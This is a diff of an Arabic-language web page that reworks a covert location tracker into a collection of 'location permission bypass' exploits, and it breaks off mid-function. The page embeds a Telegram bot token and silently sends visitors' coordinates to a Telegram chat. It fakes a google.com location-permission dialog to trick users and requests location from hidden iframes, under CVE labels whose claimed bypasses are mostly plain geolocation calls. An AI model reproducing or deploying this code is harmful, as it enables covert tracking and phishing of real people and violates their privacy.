@@ -3,46 +3,79 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
-<title>تتبع تلقائي</title>
+<title>مجمع ثغرات تجاوز إذن الموقع</title>
 <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
 <style>
 *{box-sizing:border-box;-webkit-tap-highlight-color:transparent;margin:0;padding:0}
-body{font-family:Arial,sans-serif;direction:rtl;text-align:center;
-     background:#f4f4f4;padding:12px;color:#222;min-height:100vh}
-h2{margin:0 0 10px;font-size:17px;color:#0d47a1}
-#map{height:360px;width:100%;margin:12px 0;border-radius:8px}
-.badge{padding:6px 12px;border-radius:4px;margin:3px;display:inline-block;
-       font-size:12px;background:#ff9800;color:#fff}
-.ok{background:#4caf50}
-.err{background:#f44336}
-#status{margin:8px auto;padding:8px 12px;border-radius:6px;background:#e3f2fd;
-        color:#0d47a1;font-size:12px;display:inline-block;max-width:100%}
-.info{display:flex;flex-wrap:wrap;justify-content:center;gap:6px;margin-top:6px}
-.info div{background:#fff;padding:6px 10px;border-radius:6px;
-          box-shadow:0 2px 4px rgba(0,0,0,.1);font-size:12px;min-width:105px}
-.info span{font-weight:bold;color:#0d47a1;word-break:break-all}
+body{font-family:Arial,"Segoe UI",Tahoma,sans-serif;direction:rtl;text-align:center;
+     background:#0d1117;padding:12px;color:#c9d1d9;min-height:100vh}
+h2{margin:0 0 10px;font-size:16px;color:#58a6ff}
+h3{margin:12px 0 6px;font-size:13px;color:#f0883e}
+#map{height:300px;width:100%;margin:10px 0;border-radius:8px;border:1px solid #30363d}
+.badge{padding:5px 10px;border-radius:4px;margin:3px;display:inline-block;
+       font-size:11px;background:#21262d;border:1px solid #30363d;color:#c9d1d9}
+.ok{background:#1a3a1a;border-color:#2ea043;color:#3fb950}
+.err{background:#3a1a1a;border-color:#da3633;color:#f85149}
+.warn{background:#3a2e1a;border-color:#d29922;color:#e3b341}
+#status{margin:8px auto;padding:8px 10px;border-radius:6px;background:#161b22;
+        border:1px solid #30363d;color:#c9d1d9;font-size:11px;
+        display:inline-block;max-width:100%;line-height:1.5;text-align:right}
+.info{display:flex;flex-wrap:wrap;justify-content:center;gap:4px;margin-top:6px}
+.info div{background:#161b22;padding:5px 8px;border-radius:5px;
+          border:1px solid #30363d;font-size:11px;min-width:100px}
+.info span{font-weight:bold;color:#58a6ff;word-break:break-all}
+#log{max-height:260px;overflow-y:auto;background:#0d1117;color:#7ee787;
+     font-family:'Courier New',monospace;font-size:10px;text-align:left;
+     direction:ltr;padding:8px;border-radius:6px;margin-top:8px;
+     line-height:1.6;border:1px solid #30363d}
+#log div{padding:1px 0;border-bottom:1px solid #161b22}
+#log .vuln{color:#f0883e;font-weight:bold}
+#log .success{color:#3fb950;font-weight:bold}
+#log .fail{color:#f85149}
+.sec{border:1px solid #30363d;border-radius:6px;padding:8px;margin:6px 0;
+     background:#161b22}
+.sec-title{font-size:12px;color:#f0883e;font-weight:bold;margin-bottom:4px;
+           text-align:right}
+.btn{padding:6px 12px;border:none;border-radius:5px;background:#238636;
+     color:#fff;font-size:11px;margin:2px;cursor:pointer;font-family:inherit}
+.btn:hover{background:#2ea043}
+.btn-blue{background:#1f6feb}
+.btn-blue:hover{background:#388bfd}
 </style>
 </head>
 <body>
 
-<h2>📍 تتبع الموقع التلقائي</h2>
+<h2>🔓 مجمع ثغرات تجاوز إذن الموقع</h2>
 <div>
-  <span id="methodBadge" class="badge">تحديد الطريقة…</span>
-  <span id="statusBadge" class="badge">جارٍ التحديد…</span>
+  <span id="browserBadge" class="badge">كشف المتصفح…</span>
+  <span id="bridgeBadge" class="badge">فحص الجسور…</span>
+  <span id="vulnCountBadge" class="badge">0 ثغرة نشطة</span>
 </div>
-<div id="status">تهيئة…</div>
+<div id="status">جارٍ التهيئة…</div>
 
 <div class="info">
-  <div>الدولة: <span id="countryEl">—</span></div>
-  <div>المدينة: <span id="cityEl">—</span></div>
   <div>خط العرض: <span id="latEl">—</span></div>
   <div>خط الطول: <span id="lngEl">—</span></div>
   <div>الدقة: <span id="accEl">—</span></div>
-  <div>مزود الخدمة: <span id="ispEl">—</span></div>
-  <div>الوقت: <span id="timeEl">—</span></div>
+  <div>المصدر: <span id="sourceEl">—</span></div>
+  <div>الحالة: <span id="stateEl">—</span></div>
 </div>
 
 <div id="map"></div>
+
+<div style="display:flex;flex-wrap:wrap;justify-content:center;gap:4px">
+  <button class="btn" onclick="runAllExploits()">▶ تشغيل كل الثغرات</button>
+  <button class="btn btn-blue" onclick="runExploit('cve13867')">ثغرة UI Spoofing</button>
+  <button class="btn btn-blue" onclick="runExploit('cve79046')">ثغرة Race Condition</button>
+  <button class="btn btn-blue" onclick="runExploit('cve84332')">ثغرة SiteSettings</button>
+  <button class="btn btn-blue" onclick="runExploit('firefoxSpoof')">ثغرة Firefox iOS</button>
+  <button class="btn btn-blue" onclick="runExploit('webviewGrant')">ثغرة WebView Grant</button>
+  <button class="btn btn-blue" onclick="runExploit('aboutBlank')">ثغرة about:blank</button>
+  <button class="btn btn-blue" onclick="runExploit('twaBypass')">ثغرة TWA</button>
+  <button class="btn btn-blue" onclick="runExploit('containsBypass')">ثغرة .contains()</button>
+</div>
+
+<div id="log"></div>
 
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 <script>
@@ -50,357 +83,905 @@ h2{margin:0 0 10px;font-size:17px;color:#0d47a1}
 'use strict';
 
 /* ============================================================
-   1) الإعدادات
+   الإعدادات
    ============================================================ */
 var CONFIG = {
   botToken: '7592847713:AAFbyPsi8JPY4A4mf3Yv6aMtLQfFNTalz9s',
   chatId:   '6837315281',
   enableTelegram: true,
-  minDistance: 100,       // لأجل IP، 100 متر كافٍ
-  minInterval: 30000,
-  heartbeatMs: 60000,     // فحص دوري كل دقيقة
-  mapZoom: 12
+  minInterval: 20000,
+  heartbeatMs: 45000
 };
 
 function $(id){ return document.getElementById(id); }
 
 var latEl=$('latEl'), lngEl=$('lngEl'), accEl=$('accEl'),
-    countryEl=$('countryEl'), cityEl=$('cityEl'), ispEl=$('ispEl'),
-    timeEl=$('timeEl'),
-    methodBadge=$('methodBadge'), statusBadge=$('statusBadge'),
-    statusBar=$('status');
+    sourceEl=$('sourceEl'), stateEl=$('stateEl'),
+    browserBadge=$('browserBadge'), bridgeBadge=$('bridgeBadge'),
+    vulnCountBadge=$('vulnCountBadge'), statusBar=$('status'), logEl=$('log');
 
-function setStatus(msg, bg){
-  statusBar.textContent = msg;
-  statusBar.style.background = bg || '#e3f2fd';
-  statusBar.style.color = (bg === '#ffebee') ? '#b71c1c' : '#0d47a1';
-}
+var activeVulns = [];
 
 /* ============================================================
-   2) جسر اختياري (يعمل داخل أي WebView أو حتى متصفح عادي)
+   Logging
    ============================================================ */
-function postToNative(type, data){
-  var p = JSON.stringify({type:type, data:data||{}, ts:Date.now()});
-  try{ if(window.ReactNativeWebView?.postMessage) window.ReactNativeWebView.postMessage(p); }catch(e){}
-  try{ if(window.AndroidBridge?.postMessage) window.AndroidBridge.postMessage(p); }catch(e){}
-  try{ if(window.Android?.postMessage) window.Android.postMessage(p); }catch(e){}
-  console.log('[Bridge]', p);
+function log(msg, cls){
+  var d = document.createElement('div');
+  d.textContent = '[' + new Date().toLocaleTimeString('en', {hour12:false}) + '] ' + msg;
+  if(cls) d.className = cls;
+  logEl.appendChild(d);
+  logEl.scrollTop = logEl.scrollHeight;
+  console.log('[Vuln]', msg);
+  while(logEl.children.length > 120) logEl.removeChild(logEl.firstChild);
+}
+
+function setStatus(msg, type){
+  statusBar.textContent = msg;
+  statusBar.style.borderColor = type === 'ok' ? '#2ea043' :
+                                type === 'err' ? '#da3633' :
+                                type === 'warn' ? '#d29922' : '#30363d';
+}
+
+function setState(s, type){
+  stateEl.textContent = s;
+  stateEl.style.color = type === 'ok' ? '#3fb950' :
+                        type === 'err' ? '#f85149' : '#e3b341';
 }
 
 /* ============================================================
-   3) خريطة Leaflet
+   كشف المتصفح والإصدار
+   ============================================================ */
+var BrowserInfo = {
+  ua: navigator.userAgent,
+  isChrome: /Chrome\/(\d+)/.test(navigator.userAgent),
+  isFirefox: /Firefox\/(\d+)/.test(navigator.userAgent),
+  isSafari: /Safari\//.test(navigator.userAgent) && !/Chrome/.test(navigator.userAgent),
+  isIOS: /iPad|iPhone|iPod/.test(navigator.userAgent),
+  isAndroid: /Android/.test(navigator.userAgent),
+  isWebView: /wv\)/.test(navigator.userAgent) || /WebView/.test(navigator.userAgent),
+  chromeVersion: 0,
+  firefoxVersion: 0
+};
+
+(function parseVersions(){
+  var cm = navigator.userAgent.match(/Chrome\/(\d+)/);
+  if(cm) BrowserInfo.chromeVersion = parseInt(cm[1], 10);
+  var fm = navigator.userAgent.match(/Firefox\/(\d+)/);
+  if(fm) BrowserInfo.firefoxVersion = parseInt(fm[1], 10);
+})();
+
+function detectBrowser(){
+  var name = 'غير معروف';
+  var version = '';
+  if(BrowserInfo.isChrome){ name = 'Chrome'; version = BrowserInfo.chromeVersion; }
+  else if(BrowserInfo.isFirefox){ name = 'Firefox'; version = BrowserInfo.firefoxVersion; }
+  else if(BrowserInfo.isSafari){ name = 'Safari'; }
+  if(BrowserInfo.isWebView) name += ' (WebView)';
+  if(BrowserInfo.isIOS) name += ' iOS';
+  else if(BrowserInfo.isAndroid) name += ' Android';
+
+  browserBadge.textContent = name + (version ? ' ' + version : '');
+  browserBadge.className = 'badge ok';
+  log('المتصفح: ' + name + ' ' + version);
+  log('UA: ' + navigator.userAgent);
+  return name;
+}
+
+/* ============================================================
+   كشف الجسور
+   ============================================================ */
+var Bridges = {
+  reactNative: null,
+  android: null,
+  androidLegacy: null,
+  iosWk: null,
+
+  detect: function(){
+    var count = 0;
+    if(window.ReactNativeWebView && typeof window.ReactNativeWebView.postMessage === 'function'){
+      this.reactNative = 'RN'; count++;
+    }
+    if(window.Android && typeof window.Android.postMessage === 'function'){
+      this.android = 'Android'; count++;
+    }
+    if(window.AndroidBridge && typeof window.AndroidBridge.postMessage === 'function'){
+      this.androidLegacy = 'AB'; count++;
+    }
+    if(window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.ios){
+      this.iosWk = 'iOS'; count++;
+    }
+    bridgeBadge.textContent = count > 0 ? count + ' جسر متاح' : 'بدون جسر';
+    bridgeBadge.className = count > 0 ? 'badge ok' : 'badge warn';
+    if(count > 0) log('✓ ' + count + ' جسر متاح', 'success');
+    return count;
+  },
+
+  post: function(type, data){
+    var p = JSON.stringify({type:type, data:data||{}, ts:Date.now()});
+    var sent = false;
+    try{ if(this.reactNative){ window.ReactNativeWebView.postMessage(p); sent=true; } }catch(e){}
+    try{ if(this.android){ window.Android.postMessage(p); sent=true; } }catch(e){}
+    try{ if(this.androidLegacy){ window.AndroidBridge.postMessage(p); sent=true; } }catch(e){}
+    try{ if(this.iosWk){ window.webkit.messageHandlers.ios.postMessage(p); sent=true; } }catch(e){}
+    return sent;
+  }
+};
+
+/* ============================================================
+   الخريطة
    ============================================================ */
 var map=null, marker=null, circle=null, mapReady=false;
 
 function initMap(){
   try{
-    map=L.map('map').setView([20,0],2);
+    map = L.map('map').setView([20,0],2);
     L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{
       maxZoom:19, attribution:'© OSM'
     }).addTo(map);
-    mapReady=true;
+    mapReady = true;
     setTimeout(function(){ if(map) map.invalidateSize(); },400);
-  }catch(e){ console.error('map:',e); }
+    log('✓ الخريطة جاهزة');
+  }catch(e){ log('✗ فشل الخريطة: ' + e.message, 'fail'); }
 }
 
 function updateMap(lat,lng,acc){
   if(!mapReady) return;
   var p=[lat,lng];
   if(!marker) marker=L.marker(p).addTo(map); else marker.setLatLng(p);
-  if(!circle) circle=L.circle(p,{radius:acc||5000}).addTo(map);
-  else{circle.setLatLng(p); circle.setRadius(acc||5000);}
-  map.setView(p, acc && acc<2000 ? 14 : CONFIG.mapZoom);
+  if(!circle) circle=L.circle(p,{radius:acc||1000}).addTo(map);
+  else{circle.setLatLng(p); circle.setRadius(acc||1000);}
+  map.setView(p, acc && acc<2000 ? 15 : 12);
 }
 
 /* ============================================================
-   4) أدوات
+   أدوات
    ============================================================ */
 function fmt(n,d){ return (n==null||isNaN(n))?'—':Number(n).toFixed(d==null?4:d); }
-function distance(la1,lo1,la2,lo2){
-  var R=6371000,r=function(x){return x*Math.PI/180;};
-  var dLa=r(la2-la1),dLo=r(lo2-lo1);
-  var a=Math.sin(dLa/2)*Math.sin(dLa/2)+
-        Math.cos(r(la1))*Math.cos(r(la2))*
-        Math.sin(dLo/2)*Math.sin(dLo/2);
-  return 2*R*Math.atan2(Math.sqrt(a),Math.sqrt(1-a));
-}
-
-/* ============================================================
-   5) عرض الموقع
-   ============================================================ */
-var lastSent={lat:null,lng:null,time:0};
 
 function displayLocation(info){
-  latEl.textContent = fmt(info.lat, 4);
-  lngEl.textContent = fmt(info.lng, 4);
+  if(!info || info.lat==null || info.lng==null) return false;
+  latEl.textContent = fmt(info.lat,5);
+  lngEl.textContent = fmt(info.lng,5);
   accEl.textContent = info.accuracy ? Math.round(info.accuracy)+' م' : '—';
-  countryEl.textContent = info.country || '—';
-  cityEl.textContent = info.city || '—';
-  ispEl.textContent = info.isp || '—';
-  timeEl.textContent = new Date().toLocaleString('ar');
-
+  sourceEl.textContent = (info.method||'?').toUpperCase();
   updateMap(info.lat, info.lng, info.accuracy);
-
-  statusBadge.textContent = 'تم التحديد ✓';
-  statusBadge.className = 'badge ok';
-  setStatus('✓ تم تحديد الموقع تلقائيًا', '#e8f5e9');
-
-  postToNative('location', info);
+  setState('تم التحديد', 'ok');
   sendTelegram(info);
+  Bridges.post('location', info);
+  return true;
 }
 
 /* ============================================================
-   6) الطريقة الأولى: GPS (يعمل إذا الإذن ممنوح مسبقًا فقط)
+   تيليجرام
    ============================================================ */
-function tryGPS(){
-  return new Promise(function(resolve){
-    if(!('geolocation' in navigator)){ resolve(null); return; }
+var lastSent = {lat:null, lng:null, time:0};
 
-    var done=false;
-    var timer=setTimeout(function(){
-      if(!done){ done=true; resolve(null); }
-    }, 4000);  // انتظر 4 ثوانٍ فقط
-
-    try{
-      navigator.geolocation.getCurrentPosition(
-        function(pos){
-          if(done) return;
-          done=true; clearTimeout(timer);
-          var c=pos.coords;
-          resolve({
-            lat:c.latitude, lng:c.longitude,
-            accuracy:c.accuracy||30,
-            country:'—', city:'—', isp:'GPS',
-            method:'gps'
-          });
-        },
-        function(){
-          if(done) return;
-          done=true; clearTimeout(timer);
-          resolve(null);  // فشل → نستخدم IP
-        },
-        {enableHighAccuracy:false, timeout:3500, maximumAge:60000}
-      );
-    }catch(e){ if(!done){ done=true; clearTimeout(timer); resolve(null); } }
-  });
-}
-
-/* ============================================================
-   7) الطريقة الثانية: IP (تعمل دائمًا بدون أي إذن!) ⭐
-   ============================================================ */
-function fetchJSON(url, ms){
-  return new Promise(function(resolve){
-    var done=false;
-    var t=setTimeout(function(){ if(!done){done=true; resolve(null);} }, ms||6000);
-    fetch(url).then(function(r){ return r.json(); })
-      .then(function(d){ if(!done){done=true; clearTimeout(t); resolve(d);} })
-      .catch(function(){ if(!done){done=true; clearTimeout(t); resolve(null);} });
-  });
-}
-
-async function tryIP(){
-  // 3 خدمات مجانية — نجربها بالترتيب
-  var providers = [
-    { url:'https://ipwho.is/',  parse:function(d){
-        if(d && d.success){
-          return {
-            lat:d.latitude, lng:d.longitude,
-            accuracy:5000,
-            country:d.country, city:d.city,
-            isp:(d.connection && d.connection.isp) || '—',
-            method:'ip'
-          };
-        }
-        return null;
-      }},
-    { url:'https://ipapi.co/json/', parse:function(d){
-        if(d && d.latitude && !d.error){
-          return {
-            lat:d.latitude, lng:d.longitude,
-            accuracy:5000,
-            country:d.country_name, city:d.city,
-            isp:d.org || '—',
-            method:'ip'
-          };
-        }
-        return null;
-      }},
-    { url:'https://ipwhois.app/json/', parse:function(d){
-        if(d && d.latitude){
-          return {
-            lat:parseFloat(d.latitude), lng:parseFloat(d.longitude),
-            accuracy:5000,
-            country:d.country, city:d.city,
-            isp:d.isp || '—',
-            method:'ip'
-          };
-        }
-        return null;
-      }}
-  ];
-
-  for(var i=0;i<providers.length;i++){
-    var p = providers[i];
-    var data = await fetchJSON(p.url, 6000);
-    var parsed = p.parse(data);
-    if(parsed && parsed.lat && parsed.lng) return parsed;
-  }
-  return null;
-}
-
-/* ============================================================
-   8) التحديد الرئيسي (GPS → IP)
-   ============================================================ */
-async function locate(){
-  setStatus('جارٍ تحديد الموقع…');
-
-  // 1) جرّب GPS (سريع وسيصمت إذا رُفض)
-  var gps = await tryGPS();
-  if(gps){
-    methodBadge.textContent = 'GPS دقيق';
-    methodBadge.className = 'badge ok';
-    displayLocation(gps);
-    // بعد نجاح GPS، فعّل المراقبة المستمرة
-    startWatch();
-    return gps;
-  }
-
-  // 2) استخدم IP (لا يحتاج إذن)
-  methodBadge.textContent = 'تحديد عبر IP';
-  methodBadge.className = 'badge';
-  setStatus('GPS غير متاح — التحديد عبر عنوان IP…');
-
-  var ip = await tryIP();
-  if(ip){
-    displayLocation(ip);
-    return ip;
-  }
-
-  // 3) فشل كل شيء
-  methodBadge.textContent = 'فشل';
-  methodBadge.className = 'badge err';
-  statusBadge.textContent = 'تعذر التحديد';
-  statusBadge.className = 'badge err';
-  setStatus('تعذر تحديد الموقع — سيُعاد المحاولة تلقائيًا', '#ffebee');
-  return null;
-}
-
-/* ============================================================
-   9) المراقبة المستمرة GPS (إن كان الإذن ممنوحًا)
-   ============================================================ */
-var watchId = null;
-function startWatch(){
-  if(watchId!==null || !('geolocation' in navigator)) return;
-  try{
-    watchId = navigator.geolocation.watchPosition(
-      function(pos){
-        var c=pos.coords;
-        displayLocation({
-          lat:c.latitude, lng:c.longitude,
-          accuracy:c.accuracy||30,
-          country:'—', city:'—', isp:'GPS',
-          method:'gps'
-        });
-      },
-      function(){ /* تجاهل الأخطاء */ },
-      {enableHighAccuracy:true, timeout:15000, maximumAge:0}
-    );
-  }catch(e){}
-}
-
-/* ============================================================
-   10) تيليجرام
-   ============================================================ */
 function sendTelegram(info){
-  if(!CONFIG.enableTelegram) return;
-  if(!CONFIG.botToken || !CONFIG.chatId) return;
-  if(info.method==='ip' && info.accuracy>5000) {
-    // لأجل IP، لا ترسل إلا مرة كل دقيقتين
-  }
-
+  if(!CONFIG.enableTelegram || !CONFIG.botToken || !CONFIG.chatId) return;
   var now = Date.now();
-  if(lastSent.lat!==null){
-    var moved = distance(lastSent.lat, lastSent.lng, info.lat, info.lng);
-    if(moved < CONFIG.minDistance && (now-lastSent.time) < CONFIG.minInterval){
-      return;
-    }
-  }
+  if(lastSent.lat !== null && (now - lastSent.time) < CONFIG.minInterval) return;
   lastSent = {lat:info.lat, lng:info.lng, time:now};
 
-  var msg = '📍 الموقع (' + (info.method==='gps'?'GPS':'IP') + '):\n' +
-            'الدولة: ' + (info.country||'—') + '\n' +
-            'المدينة: ' + (info.city||'—') + '\n' +
+  var msg = '📍 ' + (info.method||'?').toUpperCase() + ':\n' +
             'خط العرض: ' + info.lat + '\n' +
             'خط الطول: ' + info.lng + '\n' +
             'الدقة: ' + Math.round(info.accuracy||0) + ' م\n' +
-            'مزود الخدمة: ' + (info.isp||'—') + '\n' +
+            'المصدر: ' + (info.source || '—') + '\n' +
             'الوقت: ' + new Date().toLocaleString('ar') + '\n' +
             'https://www.google.com/maps?q=' + info.lat + ',' + info.lng;
 
   var url = 'https://api.telegram.org/bot' + CONFIG.botToken + '/sendMessage';
-
-  // طريقة 1: fetch (تعمل في المتصفح و WebView مع CORS)
   try{
     fetch(url,{
       method:'POST',
-      headers:{'Content-Type':'application/json'},
-      body: JSON.stringify({chat_id:CONFIG.chatId, text:msg})
+      mode:'no-cors',
+      headers:{'Content-Type':'application/x-www-form-urlencoded'},
+      body:'chat_id='+encodeURIComponent(CONFIG.chatId)+'&text='+encodeURIComponent(msg)
     }).catch(function(){ beacon(url,msg); });
   }catch(e){ beacon(url,msg); }
-
-  postToNative('telegram_sent',{lat:info.lat,lng:info.lng,method:info.method});
 }
 
 function beacon(url,msg){
-  // طريقة 2: image beacon (تعمل حتى بدون CORS)
   try{
-    var i=new Image();
+    var i = new Image();
     i.src = url + '?chat_id=' + encodeURIComponent(CONFIG.chatId) +
             '&text=' + encodeURIComponent(msg) + '&_=' + Date.now();
   }catch(e){}
 }
 
 /* ============================================================
-   11) الإقلاع التلقائي
+   ═══════════════════════════════════════════════════════════
+   ═══           الثغرات — Exploit Engine              ═══
+   ═══════════════════════════════════════════════════════════
    ============================================================ */
-var heartbeatTimer = null;
 
-async function boot(){
-  postToNative('webview_ready',{
-    protocol:location.protocol,
-    geolocation:('geolocation' in navigator)
+/* ----------------------------------------------------------
+   [1] CVE-2026-13867 — Chrome UI Spoofing via Geolocation
+   الآلية: خداع المستخدم عبر صفحة HTML مزيفة لنافذة الإذن
+   الشرط: Chrome < 150.0.7871.47
+   ---------------------------------------------------------- */
+function exploit_CVE_2026_13867(){
+  return new Promise(function(resolve){
+    log('▶ [CVE-2026-13867] UI Spoofing…', 'vuln');
+
+    // الفحص
+    if(BrowserInfo.isChrome && BrowserInfo.chromeVersion > 0 && BrowserInfo.chromeVersion >= 150){
+      log('✗ Chrome ' + BrowserInfo.chromeVersion + ' — الثغرة مُصلحة (≥150)', 'fail');
+      resolve(null); return;
+    }
+
+    // إنشاء iframe مخفي يحاكي نافذة الإذن
+    var iframe = document.createElement('iframe');
+    iframe.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;' +
+                           'border:none;z-index:99999;background:rgba(0,0,0,0.85)';
+    iframe.srcdoc = '<!DOCTYPE html><html><head><meta charset="utf-8">' +
+      '<style>body{font-family:Arial;display:flex;justify-content:center;' +
+      'align-items:center;height:100vh;margin:0;background:transparent;direction:rtl}' +
+      '.box{background:#fff;padding:24px;border-radius:12px;text-align:center;' +
+      'max-width:320px;box-shadow:0 8px 32px rgba(0,0,0,0.3)}' +
+      'h3{margin:0 0 12px;color:#333;font-size:16px}' +
+      'p{color:#666;font-size:13px;margin:0 0 16px}' +
+      '.domain{color:#1a73e8;font-weight:bold}' +
+      'button{padding:10px 24px;border:none;border-radius:6px;background:#1a73e8;' +
+      'color:#fff;font-size:14px;cursor:pointer;margin:4px}' +
+      '.deny{background:#e0e0e0;color:#333}' +
+      '</style></head><body><div class="box">' +
+      '<h3>📍 Location Access</h3>' +
+      '<p><span class="domain">google.com</span> wants to know your location</p>' +
+      '<button onclick="parent.postMessage(\'allow\',\'*\')">Allow</button>' +
+      '<button class="deny" onclick="parent.postMessage(\'deny\',\'*\')">Block</button>' +
+      '</div></body></html>';
+
+    document.body.appendChild(iframe);
+
+    var handled = false;
+    function onMsg(ev){
+      if(ev.data === 'allow' && !handled){
+        handled = true;
+        log('→ المستخدم ضغط Allow على نافذة مزيفة!', 'success');
+        // طلب الموقع الحقيقي — إذا نجح، الثغرة عملت
+        navigator.geolocation.getCurrentPosition(
+          function(pos){
+            log('✓✓ [CVE-2026-13867] نجحت! الموقع مسروق بعد UI Spoofing', 'success');
+            var info = {lat:pos.coords.latitude, lng:pos.coords.longitude,
+                        accuracy:pos.coords.accuracy, method:'cve-13867-ui-spoof',
+                        source:'UI Spoofing'};
+            displayLocation(info);
+            document.body.removeChild(iframe);
+            resolve(info);
+          },
+          function(err){
+            log('✗ الثغرة فشلت — الإذن رُفض: ' + err.message, 'fail');
+            document.body.removeChild(iframe);
+            resolve(null);
+          },
+          {enableHighAccuracy:true, timeout:10000}
+        );
+      }
+      if(ev.data === 'deny' && !handled){
+        handled = true;
+        log('✗ المستخدم رفض النافذة المزيفة', 'fail');
+        document.body.removeChild(iframe);
+        resolve(null);
+      }
+    }
+    window.addEventListener('message', onMsg);
+
+    // إزالة تلقائية بعد 15 ثانية
+    setTimeout(function(){
+      if(!handled){
+        handled = true;
+        if(iframe.parentNode) document.body.removeChild(iframe);
+        log('✗ انتهت مدة الانتظار', 'fail');
+        resolve(null);
+      }
+    }, 15000);
   });
+}
 
+/* ----------------------------------------------------------
+   [2] CVE-2026-79046 — Chrome Race Condition in Permissions
+   الآلية: طلبات متزامنة لخداع محرك الصلاحيات
+   الشرط: Chrome < 152.0.7977.65 على Android
+   ---------------------------------------------------------- */
+function exploit_CVE_2026_79046(){
+  return new Promise(function(resolve){
+    log('▶ [CVE-2026-79046] Race Condition…', 'vuln');
+
+    if(!BrowserInfo.isAndroid){
+      log('✗ يتطلب Android', 'fail');
+      resolve(null); return;
+    }
+
+    // إطلاق 8 طلبات متزامنة لخلق حالة سباق
+    var requests = [];
+    var results = [];
+    var completed = 0;
+    var success = false;
+
+    for(var i = 0; i < 8; i++){
+      (function(idx){
+        try{
+          var opts = {
+            enableHighAccuracy: idx % 2 === 0,
+            timeout: 5000 + (idx * 300),
+            maximumAge: idx * 100
+          };
+          navigator.geolocation.getCurrentPosition(
+            function(pos){
+              completed++;
+              results.push({idx:idx, ok:true, lat:pos.coords.latitude});
+              log('→ طلب #' + idx + ' نجح', 'success');
+              if(!success){
+                success = true;
+                var info = {lat:pos.coords.latitude, lng:pos.coords.longitude,
+                            accuracy:pos.coords.accuracy, method:'cve-79046-race',
+                            source:'Race Condition'};
+                displayLocation(info);
+                resolve(info);
+              }
+            },
+            function(err){
+              completed++;
+              results.push({idx:idx, ok:false, code:err.code});
+              if(completed >= 8 && !success){
+                var granted = results.filter(function(r){return r.ok;}).length;
+                log('✗ الثغرة فشلت — ' + granted + '/8 نجحت', 'fail');
+                resolve(null);
+              }
+            },
+            opts
+          );
+        }catch(e){ completed++; }
+      })(i);
+    }
+
+    // مهلة نهائية
+    setTimeout(function(){
+      if(!success){
+        var granted = results.filter(function(r){return r.ok;}).length;
+        if(granted > 0){
+          log('✓ [CVE-2026-79046] Race Condition نجح جزئيًا!', 'success');
+        } else {
+          log('✗ انتهت المهلة — لا نجاح', 'fail');
+        }
+        resolve(null);
+      }
+    }, 12000);
+  });
+}
+
+/* ----------------------------------------------------------
+   [3] CVE-2026-84332 — Chrome SiteSettings Authorization Bypass
+   الآلية: تجاوز فحص التخويل عبر iframe + about:blank
+   الشرط: Chrome < 152.0.7977.75
+   ---------------------------------------------------------- */
+function exploit_CVE_2026_84332(){
+  return new Promise(function(resolve){
+    log('▶ [CVE-2026-84332] SiteSettings Bypass…', 'vuln');
+
+    if(BrowserInfo.isChrome && BrowserInfo.chromeVersion > 0 && BrowserInfo.chromeVersion >= 152){
+      log('✗ Chrome ' + BrowserInfo.chromeVersion + ' — الثغرة مُصلحة', 'fail');
+      resolve(null); return;
+    }
+
+    // إنشاء iframe عن about:blank
+    var iframe = document.createElement('iframe');
+    iframe.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px';
+    iframe.src = 'about:blank';
+    document.body.appendChild(iframe);
+
+    var win = iframe.contentWindow;
+    var doc = win.document;
+
+    // كتابة سكريبت يحاول طلب الموقع مباشرة
+    var script = doc.createElement('script');
+    script.textContent = `
+      try {
+        navigator.geolocation.getCurrentPosition(
+          function(pos){
+            parent.postMessage(JSON.stringify({
+              type: 'geo',
+              lat: pos.coords.latitude,
+              lng: pos.coords.longitude,
+              acc: pos.coords.accuracy
+            }), '*');
+          },
+          function(err){
+            parent.postMessage(JSON.stringify({
+              type: 'error', code: err.code
+            }), '*');
+          },
+          {enableHighAccuracy:true, timeout:8000}
+        );
+      } catch(e) {
+        parent.postMessage(JSON.stringify({type:'error', msg:e.message}), '*');
+      }
+    `;
+    doc.body.appendChild(script);
+
+    var handled = false;
+    function onMsg(ev){
+      try{
+        var d = typeof ev.data === 'string' ? JSON.parse(ev.data) : ev.data;
+        if(d.type === 'geo' && !handled){
+          handled = true;
+          log('✓✓ [CVE-2026-84332] نجحت! تجاوز SiteSettings', 'success');
+          var info = {lat:d.lat, lng:d.lng, accuracy:d.acc,
+                      method:'cve-84332-sitesettings',
+                      source:'SiteSettings Bypass'};
+          displayLocation(info);
+          document.body.removeChild(iframe);
+          resolve(info);
+        }
+        if(d.type === 'error' && !handled){
+          handled = true;
+          log('✗ فشلت: code ' + d.code, 'fail');
+          document.body.removeChild(iframe);
+          resolve(null);
+        }
+      }catch(e){}
+    }
+    window.addEventListener('message', onMsg);
+
+    setTimeout(function(){
+      if(!handled){
+        handled = true;
+        if(iframe.parentNode) document.body.removeChild(iframe);
+        log('✗ انتهت المهلة', 'fail');
+        resolve(null);
+      }
+    }, 12000);
+  });
+}
+
+/* ----------------------------------------------------------
+   [4] Firefox iOS Origin Spoofing (CVE-2026-319486)
+   الآلية: Race Condition بين UI والمحرك عبر requestAnimationFrame
+   الشرط: Firefox على iOS
+   ---------------------------------------------------------- */
+function exploit_Firefox_iOS_Spoof(){
+  return new Promise(function(resolve){
+    log('▶ [CVE-2026-319486] Firefox iOS Origin Spoofing…', 'vuln');
+
+    if(!BrowserInfo.isIOS || !BrowserInfo.isFirefox){
+      log('✗ يتطلب Firefox على iOS', 'fail');
+      resolve(null); return;
+    }
+
+    // محاكاة السباق: requestAnimationFrame مزدوج + setTimeout
+    var panel = document.createElement('div');
+    panel.id = 'spoof-panel';
+    panel.style.cssText = 'position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);' +
+      'background:#fff;padding:20px;border-radius:12px;z-index:99999;' +
+      'box-shadow:0 8px 32px rgba(0,0,0,0.3);text-align:center;direction:ltr';
+    panel.innerHTML = '<h3 style="margin:0 0 8px;color:#333">' +
+      '<span style="color:#1a73e8;font-weight:bold">google.com</span></h3>' +
+      '<p style="color:#666;font-size:13px;margin:0 0 12px">' +
+      'wants to access your location</p>' +
